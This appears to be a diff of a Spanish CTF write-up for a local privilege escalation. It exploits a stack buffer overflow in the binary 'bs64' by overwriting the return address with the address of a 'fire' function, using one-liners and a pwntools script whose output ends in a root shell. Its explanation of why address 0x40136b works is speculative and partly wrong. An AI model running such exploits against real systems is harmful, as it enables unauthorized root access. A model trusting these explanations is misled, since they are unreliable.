@@ -352,25 +352,129 @@ Ahora toca sacar el valor de offset en dicha direccion: Tenemos que el valor del
  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
 [*] Exact match at offset 72
 ```
-La salida de checksec te da un desglose de las protecciones de seguridad que están activas en el binario.
+# Explotacion
+`maquina victima`
 
-    File: Es el nombre del archivo binario que estás analizando (bs64).
-    Arch: La arquitectura del binario es amd64 (es decir, 64 bits).
+```ruby
+objdump -d bs64 | grep fire
 
-RELRO es una protección de seguridad que ayuda a evitar ciertos tipos de ataques, como la escritura en las direcciones de memoria que deberían ser solo de lectura.
+000000000040136a <fire>:
+```
+Con esto sabemos que tendremos que rellenar el EIP con esa direccion de memoria para que se ejecute el `/bin/sh` que contiene dicha funcion fire.
 
-    Partial RELRO: El binario tiene protección parcial. Esto significa que se protege solo una parte de las secciones de memoria, pero no todo. No es la forma más segura, pero es algo mejor que no tener RELRO en absoluto. El Full RELRO proporciona una protección más fuerte contra ciertos ataques de escritura en memoria.
+Como esta en `little-endian` tendremos que darle la vuelta de la siguiente forma:
+```ruby
+\x6a\x13\x40\x00\x00\x00\x00\x00
+```
+```ruby
+python3 -c "import sys; sys.stdout.buffer.write(b'A' * 72 + b'\x6a\x13\x40\x00\x00\x00\x00\x00')" | ./bs64
+```
+Pero nos da un error al intentar rellenar el EIP con la funcion fire, aunque lo intentemos de forma manual no se por que no va de ninguna manera, sigue dando un error, por lo que probaremos a montarnos un script con el paquete pwn para que nos facilite mas la tarea.
 
-El canary es una técnica que ayuda a prevenir desbordamientos de buffer al insertar un valor secreto antes de la dirección de retorno en la pila. Si un atacante intenta sobrescribir la dirección de retorno, el canario cambiará, lo que provoca que el programa termine (o se comporte de manera inesperada). No canary found: El binario no tiene protección de canario. Esto hace que sea más vulnerable a ataques de desbordamiento de buffer, ya que no se está protegiendo explícitamente la pila.
+La forma manual nos puede estar dando un error por el echo de que la direccion puede tener caracteres especiales que no estan siendo escapados correctamente, por lo que a la hora de hacerlo con un script esos caracteres se incluyen de forma correcta, este comando si se ejecutaria bien
 
-NX (No eXecute) es una protección que asegura que ciertas áreas de la memoria (como la pila) no se pueden ejecutar como código. Esto evita que los atacantes ejecuten código arbitrario en la pila, como lo harían en un ataque de buffer overflow.
+```ruby
+python3 -c "from pwn import *; p=process('./bs64'); p.sendline(b'A' * 72 + p64(0x40136b)); p.interactive()"
+```
+Y con esto ya seremos `root`, pero si queremos hacerlo con un script bien echo, seria de la siguiente forma.
 
-    NX enabled: NX está habilitado, lo que significa que la pila y otras regiones de la memoria no pueden ser ejecutadas, haciendo que ciertos tipos de explotación, como la ejecución de código malicioso desde la pila, sean más difíciles.
+```ruby
+cd /tmp
+```
 
-PIE (Position Independent Executable) es una característica que hace que el binario sea más difícil de predecir. Cuando PIE está habilitado, el binario se carga en direcciones aleatorias de la memoria cada vez que se ejecuta, lo que hace que la explotación de vulnerabilidades sea más difícil.
+`exploit.py`
 
-    No PIE: No está habilitado PIE, lo que significa que el binario se carga en una dirección fija (en este caso, 0x400000). Esto hace que sea más fácil para un atacante predecir la ubicación de funciones y otros componentes importantes en la memoria.
+```ruby
+#!/bin/python3
 
-Los binarios "stripped" son aquellos a los que se les han eliminado los símbolos de depuración (como nombres de funciones y variables). Esto hace que el binario sea más difícil de analizar y explotar porque se pierde información útil.
+from pwn import *
 
-    No: El binario no está despojado de símbolos, lo que significa que tiene información de depuración (por ejemplo, nombres de funciones). Esto puede ser útil para la explotación y el análisis.
+# Configuración del binario
+binary = '/home/kali/secure/bs64'  # Reemplaza con la ruta del binario
+context.binary = binary
+
+# Cargar el binario
+elf = ELF(binary)
+p = process(binary)
+
+# Dirección de la función "fire"
+fire_func = 0x40136b  # Dirección de la función fire
+
+# Crear el payload
+payload = b"A" * 72  # Relleno hasta el EIP (offset de 72 bytes)
+payload += p64(fire_func)  # Dirección de la función "fire"
+
+# Enviar el payload
+log.info(f"Enviando payload: {payload}")
+p.sendline(payload)
+
+# Mantener la interacción
+p.interactive()
+```
+
+Una vez creado el script si probamos con la direccion que obtenemos al principio 0x40136a no nos ira, pero si probamos la siguiente 0x40136b esta si que funcionara.
+
+# explicacion de la explotacion 
+
+
+#  1. Dirección de fire y el desplazamiento en la pila
+
+La dirección de la función fire en tu binario es 0x40136a, pero cuando el exploit funciona, usas 0x40136b. La razón de esta diferencia tiene que ver con cómo las funciones y las direcciones se almacenan en la memoria.
+
+`Explicación técnica`
+
+  La dirección de la función fire es 0x40136a, pero al estar trabajando con un buffer y realizando un overflow de la pila, la dirección de retorno que se sobrescribe no se refiere exactamente a `0x40136a`.
+
+ `Posible causa:` Debido a la forma en que se alinean las instrucciones de la CPU o el compilador optimiza el código, la instrucción de retorno (ret) de la función fire podría estar en un byte diferente al de la dirección `10x40136a`. En lugar de sobrescribir exactamente en 0x40136a, sobrescribes un byte adicional, que puede estar en `0x40136b`.
+
+Por lo tanto, en lugar de apuntar exactamente a 0x40136a, se apunta a 0x40136b y es eso lo que hace que funcione.
+# 2. Por qué no funciona la forma manual
+
+Cuando intentas realizar el exploit de manera manual (es decir, sin un script), puede que no esté funcionando correctamente por uno o varios de estos motivos:
+
+# A. Dirección en formato little-endian
+
+Cuando proporcionas la dirección manualmente, asegúrate de que esté en little-endian, ya que la arquitectura x86_64 usa este formato para las direcciones de memoria. El formato little-endian invierte el orden de los bytes de una dirección para que se almacenen en memoria correctamente.
+
+  
+Si tienes la dirección 0x40136b, debería ser invertida para su uso en la pila:
+    En formato little-endian, 0x40136b se representaría como \x6b\x13\x40\x00\x00\x00\x00\x00.
+
+
+# B. Error en la cantidad de bytes de relleno (offset)
+
+El offset que mencionas es de 72 bytes. Esto significa que debes escribir 72 bytes de relleno antes de colocar la dirección que sobrescribe la dirección de retorno.
+Asegúrate de que estés escribiendo exactamente 72 caracteres de relleno ('A' * 72) antes de colocar la dirección de fire. Si no lo haces correctamente, el puntero de retorno puede estar apuntando a un lugar incorrecto.
+
+$ C. Problemas con el entorno de ejecución
+
+Cuando lo haces manualmente, puede que el entorno de ejecución (por ejemplo, el terminal o el sistema operativo) no esté interpretando correctamente los datos que estás enviando. Si hay espacios en blanco u otros caracteres que pueden ser malinterpretados, eso puede hacer que la ejecución no funcione.
+
+Por ejemplo, asegúrate de que no haya caracteres de nueva línea () o terminadores de cadena al final de la entrada que interfieran con la ejecución.
+$ 3. ¿Por qué sí funciona con el script?
+
+Cuando usas un script, todo el proceso es manejado de manera más controlada:
+ 
+El script asegura que la dirección esté en el formato correcto (little-endian y con la cantidad correcta de bytes).
+
+El script maneja el flujo de entrada de manera consistente, asegurándose de que no haya caracteres extraños que interfieran.
+
+# Ejecucion de exploit 
+
+Ahora lo ejecutaremos de la siguiente forma:
+```ruby
+python3 exploit.py
+[*] '/home/kali/secure/bs64'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/home/kali/secure/bs64': pid 163
+[*] Enviando payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x13@\x00\x00\x00\x00\x00'
+[*] Switching to interactive mode
+Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN
+$ whoami
+root
+```
+Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
